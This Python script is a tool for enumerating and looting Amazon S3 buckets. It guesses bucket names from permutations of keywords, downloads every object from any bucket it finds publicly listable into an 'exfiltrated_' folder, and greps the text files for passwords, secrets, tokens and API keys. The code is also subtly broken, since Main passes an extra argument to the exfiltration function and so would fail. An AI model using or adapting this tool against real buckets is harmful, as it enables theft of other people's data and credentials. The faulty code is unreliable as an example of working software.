import os
import time
import requests
import itertools
import xml.etree.ElementTree as XmlElementTree

def PromptForMode() -> str:
    print("[MODE] Select input method:")
    print("1. Enter exact bucket name")
    print("2. Enter keyword list (auto-combo mode)")
    strChoice = input("Enter choice (1 or 2): ").strip()
    return strChoice

def PromptForBucketName() -> str:
    strBucketName = input("Enter target S3 bucket name (without s3://): ").strip()
    return strBucketName

def PromptForKeywords() -> list[str]:
    strInput = input("Enter keywords (max 4, space-separated, e.g. dev secret test): ")
    return strInput.strip().lower().split()

def GenerateBucketCombos(aKeywords: list[str]) -> list[str]:
    aCombinations = []
    for n in range(2, min(len(aKeywords)+1, 5)):
        for aCombo in itertools.permutations(aKeywords, n):
            strJoinedDash = '-'.join(aCombo)
            strJoinedUnderscore = '_'.join(aCombo)
            strJoinedPlain = ''.join(aCombo)
            aCombinations.extend([strJoinedDash, strJoinedUnderscore, strJoinedPlain])
    return list(set(aCombinations))

def CheckIfBucketIsPublic(strBucketName: str) -> tuple[bool, str]:
    strBucketURL = f"http://{strBucketName}.s3.amazonaws.com/"
    print(f"[INFO] {strBucketName}")
    try:
        objResponse = requests.get(strBucketURL, timeout=(2, 5))
        bIsPublic = (objResponse.status_code == 200)
        strResponseText = objResponse.text
        return bIsPublic, strResponseText
    except Exception as e:
        print(f"[ERROR] {strBucketName} error: {str(e)}")
        return False, ""

def ParseS3FileKeys(strXMLResponse: str) -> list[str]:
    aKeys = []
    try:
        objXMLRoot = XmlElementTree.fromstring(strXMLResponse)
        for objElement in objXMLRoot.iter('{http://s3.amazonaws.com/doc/2006-03-01/}Key'):
            if objElement.text:
                aKeys.append(objElement.text)
    except XmlElementTree.ParseError:
        pass
    return aKeys

def ScanTextFileForSecrets(strFilePath: str, strOutputDir: str, aCustomKeywords: list[str] = None) -> None:
    aKeywords = aCustomKeywords if aCustomKeywords else ["password", "passwd", "secret", "key", "api", "token", "db", "auth"]
    strOutFilePath = os.path.join(strOutputDir, "relevant_lines.txt")
    aMatchedLines = []
    try:
        with open(strFilePath, 'r', encoding='utf-8', errors='ignore') as fInputFile:
            for strLine in fInputFile:
                for strKeyword in aKeywords:
                    if strKeyword.lower() in strLine.lower():
                        print(f"[FOUND] {strLine.strip()}")
                        aMatchedLines.append(strLine)
                        break
        if aMatchedLines:
            with open(strOutFilePath, 'a', encoding='utf-8') as fOutput:
                fOutput.writelines(aMatchedLines)
    except Exception as e:
        print(f"[ERROR] Failed to scan file '{strFilePath}': {str(e)}")

def DownloadS3Object(strBucketName: str, strKey: str, strOutputDir: str) -> None:
    strFileURL = f"https://{strBucketName}.s3.amazonaws.com/{strKey}"
    strSanitizedFileName = strKey.replace('/', '_')
    strOutputPath = os.path.join(strOutputDir, strSanitizedFileName)
    objResponse = requests.get(strFileURL)
    if objResponse.status_code == 200:
        with open(strOutputPath, 'wb') as fOutputFile:
            fOutputFile.write(objResponse.content)
        print(f"[INFO] Downloaded: {strKey} -> {strOutputPath}")
        if strOutputPath.lower().endswith(".txt"):
            ScanTextFileForSecrets(strOutputPath, strOutputDir)
    else:
        print(f"[ERROR] Failed to download {strKey} (HTTP {objResponse.status_code})")

def AttemptExfilFromBucket(strBucketName: str) -> None:
    bIsPublic, strXMLListing = CheckIfBucketIsPublic(strBucketName)
    if not bIsPublic:
        print(f"[ERROR] '{strBucketName}' is not publicly listable or does not exist.")
        return
    print(f"[FOUND] '{strBucketName}' is PUBLIC. Proceeding to exfiltrate files...")
    aFileKeys = ParseS3FileKeys(strXMLListing)
    if not aFileKeys:
        print("[INFO] No files found or listing disabled.")
        return
    strOutputDir = f"exfiltrated_{strBucketName}"
    os.makedirs(strOutputDir, exist_ok=True)
    for strFileKey in aFileKeys:
        print(f"[FOUND] {strFileKey} is public")
        DownloadS3Object(strBucketName, strFileKey, strOutputDir)
    print(f"[INFO] Exfiltration complete. Files saved in: {strOutputDir}")

def Main() -> None:
    strMode = PromptForMode()

    strInput = input("Enter scan keywords (space-separated), or press ENTER to use defaults: ").strip()
    aScanKeywords = strInput.lower().split() if strInput else None

    if strMode == "1":
        strBucketName = PromptForBucketName()
        AttemptExfilFromBucket(strBucketName, aScanKeywords)
    elif strMode == "2":
        aKeywords = PromptForKeywords()
        nDelaySec = int(input("Enter delay between attempts (in seconds, e.g., 5): ").strip())
        aBucketCombos = GenerateBucketCombos(aKeywords)
        print(f"[INFO] Trying {len(aBucketCombos)} bucket combinations...")
        for strBucketName in aBucketCombos:
            AttemptExfilFromBucket(strBucketName, aScanKeywords)
            time.sleep(nDelaySec)
    else:
        print("[ERROR] Invalid choice.")

if __name__ == "__main__":
    Main()
